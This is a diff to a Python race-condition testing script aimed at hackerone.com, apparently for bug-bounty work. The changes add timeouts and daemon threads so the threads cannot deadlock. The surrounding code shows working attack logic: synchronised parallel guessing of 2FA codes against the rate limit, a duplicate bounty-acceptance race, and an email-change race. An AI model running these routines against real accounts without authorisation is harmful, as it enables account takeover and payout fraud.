@@ -22,6 +22,13 @@ BASE = "https://hackerone.com"
 RESULTS = []
 LOCK = threading.Lock()
 
+# Robustness guards: if a worker thread fails to start (OS thread-limit) or
+# raises before reaching the barrier, the remaining threads must NOT block
+# forever on Barrier.wait(), and main must NOT join them without a deadline.
+# Mirrors the project's own race_audit.py pattern.
+BARRIER_TIMEOUT = 15.0   # seconds each thread waits for all parties at the barrier
+JOIN_TIMEOUT = 20.0      # seconds main waits per-thread on join()
+
 def gql_raw(token: str, query: str) -> tuple[int, dict]:
     data = json.dumps({"query": query}).encode()
     req = urllib.request.Request(
@@ -78,18 +85,21 @@ def test_2fa_rate_limit(token: str, count: int = 30):
 
     def send_code(i: int):
         code = f"{i:06d}"
-        barrier.wait()  # all threads release simultaneously
+        try:
+            barrier.wait(timeout=BARRIER_TIMEOUT)  # all threads release simultaneously
+        except threading.BrokenBarrierError:
+            return  # a peer thread never reached the barrier — bail instead of deadlocking
         status, body = rest_raw(token, "POST", "/users/two_factor_authentication",
                                  data={"user": {"otp_attempt": code}})
         with LOCK:
             responses.append((i, status, "429" in str(status) or "rate" in body.lower()))
             print(f"  [{i:02d}] code={code} HTTP={status}")
 
-    threads = [threading.Thread(target=send_code, args=(i,)) for i in range(count)]
+    threads = [threading.Thread(target=send_code, args=(i,), daemon=True) for i in range(count)]
     for t in threads:
         t.start()
     for t in threads:
-        t.join()
+        t.join(timeout=JOIN_TIMEOUT)
 
     rate_limited = [r for r in responses if r[2]]
     print(f"\n  Results: {len(responses)} requests sent")
@@ -114,18 +124,21 @@ def test_bounty_race(token_a: str, report_id: str, count: int = 20):
     def accept_bounty(i: int):
         # Try accepting bounty via GraphQL mutation
         q = f'mutation {{ acceptBounty(input: {{ report_id: "{report_id}" }}) {{ report {{ bounty_amount }} }} }}'
-        barrier.wait()
+        try:
+            barrier.wait(timeout=BARRIER_TIMEOUT)
+        except threading.BrokenBarrierError:
+            return  # a peer thread never reached the barrier — bail instead of deadlocking
         status, resp = gql_raw(token_a, q)
         amount = resp.get("data", {}).get("acceptBounty", {})
         with LOCK:
             responses.append((i, status, amount))
             print(f"  [{i:02d}] HTTP={status} data={str(amount)[:60]}")
 
-    threads = [threading.Thread(target=accept_bounty, args=(i,)) for i in range(count)]
+    threads = [threading.Thread(target=accept_bounty, args=(i,), daemon=True) for i in range(count)]
     for t in threads:
         t.start()
     for t in threads:
-        t.join()
+        t.join(timeout=JOIN_TIMEOUT)
 
     successes = [r for r in responses if r[2]]
     print(f"\n  Successful responses: {len(successes)}")
@@ -176,18 +189,21 @@ def test_email_change_race(token: str, email1: str, email2: str, count: int = 10
     def change_email(i: int):
         new_email = email1 if i % 2 == 0 else email2
         q = f'mutation {{ updateUser(input: {{ email: "{new_email}" }}) {{ user {{ email }} }} }}'
-        barrier.wait()
+        try:
+            barrier.wait(timeout=BARRIER_TIMEOUT)
+        except threading.BrokenBarrierError:
+            return  # a peer thread never reached the barrier — bail instead of deadlocking
         status, resp = gql_raw(token, q)
         result_email = resp.get("data", {}).get("updateUser", {}).get("user", {}).get("email")
         with LOCK:
             responses.append((i, new_email, status, result_email))
             print(f"  [{i:02d}] target={new_email} HTTP={status} result={result_email}")
 
-    threads = [threading.Thread(target=change_email, args=(i,)) for i in range(count)]
+    threads = [threading.Thread(target=change_email, args=(i,), daemon=True) for i in range(count)]
     for t in threads:
         t.start()
     for t in threads:
-        t.join()
+        t.join(timeout=JOIN_TIMEOUT)
 
     # Check final state
     time.sleep(1)
